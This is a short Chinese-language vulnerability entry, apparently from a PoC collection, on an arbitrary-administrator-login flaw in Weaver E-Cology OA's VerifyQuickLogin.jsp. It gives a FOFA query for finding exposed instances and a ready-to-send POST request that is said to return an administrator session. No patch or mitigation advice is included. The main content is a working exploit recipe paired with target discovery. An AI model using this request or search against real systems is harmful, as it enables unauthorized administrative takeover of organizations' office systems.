# 泛微OA E-Cology VerifyQuickLogin.jsp 任意管理员登录漏洞

## 漏洞描述

泛微OA E-Cology VerifyQuickLogin.jsp文件中存在任意管理员登录漏洞，攻击着通过发送特殊的请求包可以获取管理员Session

## 漏洞影响

```
泛微OA E-Cology
```

## FOFA

```
app="泛微-协同办公OA"
```

## 漏洞复现

产品主页

![image-20220824142008751](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202208241420826.png)

验证POC

```
POST /mobile/plugin/VerifyQuickLogin.jsp
  
identifier=1&language=1&ipaddress=x.x.x.x
```

![image-20220824142028221](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202208241420269.png)